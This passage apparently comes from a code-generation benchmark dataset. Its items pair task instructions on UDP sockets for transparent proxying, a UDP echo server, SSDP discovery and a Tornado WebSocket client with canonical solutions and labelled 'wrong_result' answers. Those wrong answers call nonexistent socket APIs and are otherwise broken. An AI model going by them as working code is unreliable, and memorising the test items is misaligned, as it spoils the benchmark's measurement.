self.onConnectionStatus.emit(self.status)\n        self.conn.close()"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\n\nclass UDPSocketHandler:\n    IP_BINDANY = socket.SOL_SOCKET\n    IP_BINDANY_OPT = socket.SO_REUSEADDR\n    IP_RECVDSTADDR = socket.SOL_IP\n    IP_RECVDSTADDR_OPT = socket.IP_RECVDSTADDR\n\n    @staticmethod\n    def recv_udp(listener: socket.socket, bufsize: int) -> tuple:\n        buf = listener.recvbufsize(bufsize)\n        srcip = listener.getsockname()\n        dstip = None\n        if hasattr(listener, 'getsockopt'):\n            optval = listener.getsockopt(UDPSocketHandler.IP_RECVDSTADDR)\n            if optval:\n                dstip = optval\n        return srcip, dstip, buf\n\n    @staticmethod\n    def send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.bind(srcip)\n        sock.sendto(data, dstip)\n\n    @staticmethod\n    def setup_udp_listener(udp_listener: object) -> None:\n        if hasattr(udp_listener, 'v4') and udp_listener.v4:\n            udp_listener.v4.setsockopt(UDPSocketHandler.IP_RECVDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6:\n            udp_listener.v6.setsockopt(UDPSocketHandler.IP_RECVDSTADDR, 1)"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with support for IP transparent proxying and original destination address retrieval.\n\nClass Description: The UDPSocketHandler class provides methods for receiving and sending UDP packets while maintaining information about both source and destination addresses. It supports both IPv4 and IPv6 protocols and includes special handling for transparent proxying scenarios.\n\nAttributes:\n[No explicit attributes are defined in the class, as it primarily operates through its methods]\n\nMethods:\n\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP packets and extracts both source and destination address information. Uses recvmsg() to get ancillary data containing the original destination address.\n  Input:\n    - listener: A bound UDP socket object\n    - bufsize: Maximum buffer size for received data\n  Output:\n    - tuple: (srcip: tuple, dstip: tuple, data: bytes) containing source address, destination address, and received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP packets while maintaining source address information through IP transparent option.\n  Input:\n    - sock: The socket to use for sending\n    - srcip: Source address tuple (IP, port)\n    - dstip: Destination address tuple (IP, port)\n    - data: The data to send\n  Output: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures UDP listener sockets for transparent proxying and original destination address retrieval.\n  Input:\n    - udp_listener: An object containing v4 and v6 socket instances\n  Output: None\n\nMethod4: setsockopt_error(e: Exception) -> None - Handles permission errors related to socket options and raises a fatal error.\n  Input:\n    - e: The caught PermissionError exception\n  Output: None (raises Fatal exception)",
    "Canonical_solution": "import socket\nimport os\nimport struct\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(\n            4096, socket.CMSG_SPACE(24))\n        dstip = None\n        family = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n                \"-- ignored UDP to %r: \"\n                \"couldn't determine source IP address\\n\" % (dstip,))\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        try:\n            udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(\n                socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)\n\n    def setsockopt_error(self, e):\n        raise Fatal(\"Insufficient permissions for tproxy method.\\n\"\n                   \"Your effective UID is %d, not 0. Try rerunning as root.\\n\"\n                   % os.geteuid())",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport errno\n\nclass UDPSocketHandler:\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> tuple:\n        try:\n            data, addr = listener.recvmsg(bufsize)\n            srcip = addr\n            dstip = self.get_original_destination(listener)\n            return (srcip, dstip, data)\n        except Exception as e:\n            self.setsockopt_error(e)\n            return None\n\n    def get_original_destination(self, listener: socket.socket) -> tuple:\n        msg_opt = listener.getsockopt(socket.SOL_SOCKET, socket.SO_RCVMSG)\n        if msg_opt:\n            for opt in msg_opt:\n                if opt[0] == socket.SO_RCVMSG:\n                    return opt[1]\n        return None\n\n    def send_udp(self, sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        try:\n            sock.sendto(data, dstip)\n            sock.setsockopt(socket.SOL_IP, socket.IP_TOS, 0)\n            sock.setsockopt(socket.SOL_IP, socket.IP_MRT6_ENABLE, 1)\n        except Exception as e:\n            self.setsockopt_error(e)\n\n    def setup_udp_listener(self, udp_listener: object) -> None:\n        try:\n            udp_listener.v4.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            udp_listener.v6.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            udp_listener.v4.bind(('0.0.0.0', 0))\n            udp_listener.v6.bind(('::0', 0))\n        except Exception as e:\n            self.setsockopt_error(e)\n\n    def setsockopt_error(self, e: Exception) -> None:\n        if e.errno == errno.EPERM:\n            raise RuntimeError(\"Permission denied when setting socket options\") from e\n        else:\n            raise e"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a UDP echo server that receives data from clients and sends the same data back to the client.\n\nFunction Description: The function `udp_echo_server` creates a UDP socket, binds it to a specified host and port, and continuously listens for incoming data. When data is received, it echoes the same data back to the sender. The function runs indefinitely until manually stopped.\n\nInput:  \n- `host` (str, optional): The local IP address to bind the socket to. Defaults to 'localhost'.  \n- `port` (int, optional): The port number to bind the socket to. Defaults to 6789.  \n\nOutput: None (The function runs indefinitely and does not return any value.)",
    "Canonical_solution": "from socket import *\n\ndef udp_echo_server(host='localhost', port=6789):\n    server = socket(AF_INET, SOCK_DGRAM)\n    server.bind((host, port))\n    while True:\n        data, addr = server.recvfrom(1024)\n        server.sendto(data, addr)\n    server.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\n\ndef udp_echo_server(host='localhost', port=6789):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n        sock.bind((host, port))\n        print(f\"UDP Echo Server running on {host}:{port}\")\n        while True:\n            data, addr = sock.recvfrom(65535)\n            print(f\"Received data from {addr}: {data.decode()}\")\n            sock.sendto(data, addr)"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a class for discovering devices on a network using SSDP (Simple Service Discovery Protocol) over UDP multicast. The class should be able to send discovery requests and handle responses from devices.\n\nClass Description: The SSDPDiscover class is responsible for discovering UPnP/DLNA devices on a local network using SSDP. It sends M-SEARCH requests to a multicast address and listens for responses. The class supports both single-socket and multi-socket modes for sending discovery requests.\n\nAttributes:\n- SSDP_ADDRESS: [str] - The multicast address for SSDP (239.255.255.250)\n- SSDP_PORT: [int] - The port number for SSDP (1900)\n- SSDP_MX: [int] - The maximum wait time for responses (in seconds)\n- SSDP_TTL: [int] - The time-to-live for multicast packets\n- SSDP_AMOUNT: [int] - The number of discovery requests to send\n- MSEARCH_PORT: [int] - The local port to bind to for sending discovery requests (0 for random)\n- MSEARCH_MSG: [str] - The M-SEARCH request message template\n- BUFFER_SIZE: [int] - The size of the buffer for receiving responses\n- USE_SINGLE_SOCKET: [bool] - Whether to use a single socket for all requests or one per interface\n- cb_on_device_response: [callable] - Callback function to handle device responses\n- host: [str] - The host address to bind to (None for all interfaces)\n- addresses: [list] - List of local IPv4 addresses\n\nMethods:\n- __init__(cb_on_device_response, host=None) -> [None] - Initializes the SSDPDiscover instance with a callback for device responses and an optional host address.\n- refresh_addresses() -> [None] - Refreshes the list of local IPv4 addresses.\n- search(ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None) -> [None] - Initiates the device discovery process with optional parameters for TTL, MX, and request amount.\n- _search(host, ssdp_ttl, ssdp_mx, ssdp_amount) -> [None] - Internal method to perform the discovery process for a specific host.\n- _send_discover(sock, ssdp_mx) -> [None] - Internal method to send an M-SEARCH request using the provided socket.",
    "Canonical_solution": "import socket\nimport threading\nimport logging\nimport chardet\nimport traceback\nimport pulseaudio_dlna.utils.network\nimport pulseaudio_dlna.plugins.dlna.ssdp\n\nlogger = logging.getLogger('pulseaudio_dlna.discover')\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 10\n    SSDP_AMOUNT = 5\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = '\\r\\n'.join([\n        'M-SEARCH * HTTP/1.1',\n        'HOST: {host}:{port}',\n        'MAN: \"ssdp:discover\"',\n        'MX: {mx}',\n        'ST: ssdp:all',\n    ]) + '\\r\\n' * 2\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = True\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = pulseaudio_dlna.utils.network.ipv4_addresses()\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            self._search(self.host or '', ssdp_ttl, ssdp_mx, ssdp_amount)\n        else:\n            if self.host:\n                self._search(self.host, ssdp_ttl, ssdp_mx, ssdp_amount)\n            else:\n                threads = []\n                for addr in self.addresses:\n                    thread = threading.Thread(\n                        target=self._search,\n                        args=[addr, ssdp_ttl, ssdp_mx, ssdp_amount])\n                    threads.append(thread)\n                try:\n                    for thread in threads:\n                        thread.start()\n                    for thread in threads:\n                        thread.join()\n                except:\n                    traceback.print_exc()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        sock.settimeout(ssdp_mx)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n        sock.bind((host, self.MSEARCH_PORT))\n\n        for i in range(1, ssdp_amount + 1):\n            t = threading.Timer(\n                float(i) / 2, self._send_discover, args=[sock, ssdp_mx])\n            t.start()\n\n        while True:\n            try:\n                header, address = sock.recvfrom(self.BUFFER_SIZE)\n                if self.cb_on_device_response:\n                    guess = chardet.detect(header)\n                    header = header.decode(guess['encoding'])\n                    header = pulseaudio_dlna.plugins.dlna.ssdp._get_header_map(header)\n                    self.cb_on_device_response(header, address)\n            except socket.timeout:\n                break\n        sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS, port=self.SSDP_PORT, mx=ssdp_mx)\n        if self.USE_SINGLE_SOCKET:\n            for addr in self.addresses:\n                sock.setsockopt(\n                    socket.SOL_IP, socket.IP_MULTICAST_IF,\n                    socket.inet_aton(addr))\n                sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))\n        else:\n            sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport threading\nimport time\nimport socket\nimport logging\nimport select\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = \"239.255.255.250\"\n    SSDP_PORT = 1900\n    SSDP_MX = 10\n    SSDP_TTL = 1\n    SSDP_AMOUNT = 1\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = \"M-SEARCH * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nMAN: \\\"ssdp:discover\\\"\\r\\nMX: {mx}\\r\\nST: upnp:rootdevice\\r\\n\\r\\n\"\n    BUFFER_SIZE = 65507\n    USE_SINGLE_SOCKET = True\n    cb_on_device_response = None\n    host = None\n    addresses = []\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = []\n        for interface in socket.if_names():\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n                s.connect((self.SSDP_ADDRESS, self.SSDP_PORT))\n                ip = s.getsockname()[0]\n                if ip not in self.addresses:\n                    self.addresses.append(ip)\n                s.close()\n            except Exception as e:\n                pass\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        if ssdp_ttl is None:\n            ssdp_ttl = self.SSDP_TTL\n        if ssdp_mx is None:\n            ssdp_mx = self.SSDP_MX\n        if ssdp_amount is None:\n            ssdp_amount = self.SSDP_AMOUNT\n        if self.USE_SINGLE_SOCKET:\n            sock = self._create_single_socket()\n            threads = []\n            for _ in range(ssdp_amount):\n                t = threading.Thread(target=self._search, args=(sock, ssdp_ttl, ssdp_mx, ssdp_amount))\n                threads.append(t)\n                t.start()\n            for t in threads:\n                t.join()\n            sock.close()\n        else:\n            for _ in range(ssdp_amount):\n                sock = self._create_single_socket()\n                threading.Thread(target=self._search, args=(sock, ssdp_ttl, ssdp_mx, ssdp_amount)).start()\n                sock.close()\n\n    def _search(self, sock, ssdp_ttl, ssdp_mx, ssdp_amount):\n        message = self.MSEARCH_MSG.format(mx=ssdp_mx)\n        sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ssdp_ttl)\n        sock.settimeout(ssdp_mx + 1)\n        while True:\n            try:\n                data, addr = sock.recvfrom(self.BUFFER_SIZE)\n                if data:\n                    self.cb_on_device_response(data, addr)\n            except socket.timeout:\n                break\n\n    def _send_discover(self, sock, ssdp_mx):\n        message = self.MSEARCH_MSG.format(mx=ssdp_mx)\n        sock.sendto(message.encode(), (self.SSDP_ADDRESS, self.SSDP_PORT))\n\n    def _create_single_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        if self.host:\n            sock.bind((self.host, self.MSEARCH_PORT))\n        else:\n            sock.bind((\"\", self.MSEARCH_PORT))\n        return sock"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Implement a UDP socket handler class that provides advanced UDP communication capabilities, including receiving original destination addresses and supporting both IPv4 and IPv6 transparent proxying.\n\nClass Description: UDPSocketHandler is a utility class designed to handle UDP socket operations with special features like retrieving original destination addresses and supporting transparent proxying. It provides methods for receiving UDP packets with ancillary data, sending UDP packets with specific source addresses, and setting up UDP listeners with appropriate socket options.\n\nAttributes:\n- recvmsg: Optional[str] - Stores the detected implementation method for recvmsg ('python', 'socket_ext', or None)\n\nMethods:\n- _detect_recvmsg_implementation() -> Optional[str] - Detects available recvmsg implementation methods\n- recv_udp(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Receives UDP data with source and destination address information\n- _recv_udp_python(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - Python native implementation of recv_udp\n- _recv_udp_socket_ext(listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes] - socket_ext implementation of recv_udp\n- _recv_udp_fallback(listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes] - Fallback implementation without ancillary data support\n- send_udp(sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None - Sends UDP data with specified source address\n- setup_udp_listener(udp_listener: socket.socket) -> None - Configures UDP listener socket with transparent proxying options",
    "Canonical_solution": "import struct\nimport socket\nfrom typing import Optional, Tuple, Any\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = self._detect_recvmsg_implementation()\n        \n    def _detect_recvmsg_implementation(self) -> Optional[str]:\n        try:\n            import socket as pythonsocket\n            getattr(pythonsocket.socket, \"recvmsg\")\n            return \"python\"\n        except AttributeError:\n            try:\n                import socket_ext\n                getattr(socket_ext.socket, \"recvmsg\")\n                return \"socket_ext\"\n            except ImportError:\n                return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == \"python\":\n            return self._recv_udp_python(listener, bufsize)\n        elif self.recvmsg == \"socket_ext\":\n            return self._recv_udp_socket_ext(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, ancdata, msg_flags, srcip = listener.recvmsg(4096, socket.CMSG_SPACE(24))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data)\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        srcip, data, adata, flags = listener.recvmsg((bufsize,), socket.CMSG_SPACE(24))\n        dstip = None\n        for a in adata:\n            if a.cmsg_level == socket.SOL_IP and a.cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n            elif a.cmsg_level == SOL_IPV6 and a.cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', a.cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                    ip = socket.inet_ntop(family, a.cmsg_data[start:start + length])\n                    dstip = (ip, port)\n                    break\n        return (srcip, dstip, data[0])\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, srcip = listener.recvfrom(bufsize)\n        return (srcip, None, data)\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if not srcip:\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        if hasattr(udp_listener, 'v4') and udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if hasattr(udp_listener, 'v6') and udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport struct\nimport sys\n\nclass UDPSocketHandler:\n    def __init__(self):\n        self.recvmsg = None\n\n    def _detect_recvmsg_implementation(self):\n        try:\n            import socket_ext\n            return 'socket_ext'\n        except ImportError:\n            return None\n\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        if self.recvmsg == 'socket_ext':\n            return self._recv_udp_socket_ext(listener, bufsize)\n        elif self.recvmsg == 'python':\n            return self._recv_udp_python(listener, bufsize)\n        else:\n            return self._recv_udp_fallback(listener, bufsize)\n\n    def _recv_udp_python(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        data, addr = listener.recvfrom(bufsize)\n        return data, addr, data\n\n    def _recv_udp_socket_ext(self, listener: socket.socket, bufsize: int) -> Tuple[Any, Optional[Tuple[str, int]], bytes]:\n        msg, ancdata, _, _ = listener.recvmsg(bufsize)\n        src_addr = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == socket.IP_PKTINFO:\n                src_addr = socket.inet_ntoa(cmsg_data[0:4]), struct.unpack('!I', cmsg_data[4:8])[0]\n        return msg, src_addr, msg\n\n    def _recv_udp_fallback(self, listener: socket.socket, bufsize: int) -> Tuple[Any, None, bytes]:\n        data, addr = listener.recvfrom(bufsize)\n        return data, None, data\n\n    def send_udp(self, sock: socket.socket, srcip: Optional[Tuple[str, int]], dstip: Tuple[str, int], data: bytes) -> None:\n        if srcip:\n            sock.sendto(data, (dstip[0], dstip[1]))\n        else:\n            sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: socket.socket) -> None:\n        udp_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        if sys.platform == 'linux':\n            udp_listener.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 0)\n            udp_listener.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, ('224.0.0.1', 12345))\n        elif sys.platform == 'win32':\n            udp_listener.ioctl(socket.SIO_SET_MULTICAST_LOOP, 1)\n            udp_listener.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, ('224.0.0.1', 12345))"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Implement a WebSocket client connection using Tornado in Python, which handles WebSocket protocol communication including connection establishment, message exchange, and connection closure.\n\nClass Description: WebSocketClientConnection is a Tornado-based WebSocket client implementation that manages the lifecycle of a WebSocket connection, including handling messages, pings, and connection events.\n\nAttributes:\n- connect_future: Future - A future representing the connection attempt\n- read_queue: Queue - A queue for incoming messages\n- key: bytes - The WebSocket handshake key\n- _on_message_callback: Optional[Callable] - Callback for received messages\n- close_code: Optional[int] - WebSocket close code\n- close_reason: Optional[str] - WebSocket close reason\n- params: _WebSocketParams - WebSocket connection parameters\n- tcp_client: TCPClient - Underlying TCP client\n- protocol: Optional[WebSocketProtocol] - WebSocket protocol handler\n\nMethods:\n- __init__(request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None - Initializes the WebSocket client connection\n- close(code: Optional[int], reason: Optional[str]) -> None - Closes the WebSocket connection\n- on_connection_close() -> None - Handles connection closure\n- on_ws_connection_close(close_code: Optional[int], close_reason: Optional[str]) -> None - Handles WebSocket-specific connection closure\n- _on_http_response(response: HTTPResponse) -> None - Handles HTTP response during connection\n- headers_received(start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None] - Processes received headers\n- write_message(message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None] - Sends a WebSocket message\n- read_message(callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]] - Reads a message from the queue\n- _on_message(message: Union[None, str, bytes]) -> Optional[Awaitable[None]] - Internal message handler\n- ping(data: bytes) -> None - Sends a ping frame\n- get_websocket_protocol() -> WebSocketProtocol - Creates the WebSocket protocol handler",
    "Canonical_solution": "import abc\nimport asyncio\nimport base64\nimport hashlib\nimport os\nimport struct\nimport tornado\nfrom urllib.parse import urlparse\nimport zlib\nfrom tornado.concurrent import Future\nfrom tornado.escape import utf8, native_str, to_unicode\nfrom tornado import gen, httpclient, httputil\nfrom tornado.ioloop import IOLoop, PeriodicCallback\nfrom tornado.iostream import StreamClosedError, IOStream\nfrom tornado.log import app_log\nfrom tornado.netutil import Resolver\nfrom tornado import simple_httpclient\nfrom tornado.queues import Queue\nfrom tornado.tcpclient import TCPClient\nfrom tornado.util import _websocket_mask\nfrom typing import Optional, Dict, Union, List, Awaitable, Callable, Tuple, Type, Any, cast\n\n_default_max_message_size = 10 * 1024 * 1024\n\nclass WebSocketClientConnection(simple_httpclient._HTTPConnection):\n    def __init__(\n        self,\n        request: httpclient.HTTPRequest,\n        on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n        compression_options: Optional[Dict[str, Any]] = None,\n        ping_interval: Optional[float] = None,\n        